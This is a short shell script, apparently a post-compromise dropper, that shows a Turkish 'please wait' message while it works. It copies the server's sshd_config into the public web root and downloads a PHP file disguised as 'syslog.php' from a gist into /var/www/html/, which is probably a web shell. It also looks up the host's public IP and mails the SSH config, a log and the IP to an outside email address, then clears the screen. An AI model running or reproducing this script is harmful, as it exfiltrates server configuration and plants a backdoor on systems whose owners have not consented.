echo "Lutfen Bekleyin..."
cp /etc/ssh/sshd_config /var/www/html/ssh.txt
touch /tmp/log.txt
cd /tmp/
curl -o ip.txt https://ipinfo.io/ip
wget -m -A ".*php" "https://gist.githubusercontent.com/B0RU70/31e16d4bc747c56cd29dbe15c787a6f5/raw/4b304386009e933518d3c1ea0d895646531aad48/syslog.php" -P /var/www/html/
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
sendmail b0ru70@ajanlar.org < /tmp/log.txt
sendmail b0ru70@ajanlar.org < /tmp/ip.txt
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
cd /root/
clear
